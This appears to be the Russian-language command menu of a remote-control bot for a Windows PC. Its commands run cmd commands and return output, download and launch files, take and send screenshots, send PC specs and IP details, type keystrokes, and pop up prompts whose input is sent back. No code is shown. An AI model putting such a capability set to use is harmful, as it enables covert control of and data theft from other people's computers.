Команды:
1. cmdi {команда}        (выполняет команду в cmd, использовать если не важен ответ команды)
2. cmdo {команда}        (выполняет команду в cmd и возращает результат её выполнения)
3. wget {ссылка} {имя сохраняемого файла} (скачивает файл из интернета и сохраняет выбраным файлом)
4. pict {имя картинки}       (открывает картинку на full screen)
5. vide {имя видео}       (открывает видео на full screen)
6. outp {текст}       (создает окно с текстом)
7. inpt {текст}       (создает окно с текстом и полем для ввода (то что введут туда отошлётся вам))
8. strt {путь до файла}       (запускает файл по выбраному пути)
9. keyb {текст}       (вводит текст)
10. scrn       (создает скриншот и отправляет вам)
11. spec       (отправляет вам характеристики пк)
12. rask       (меняет раскладку на пк)
13. ipad       (отправляет вам ip адрес пк и полные сведения о нём)
14. lock       (закрывает активное окно)
15. exit       (очищает папку с медиа которое вы отправляли боту)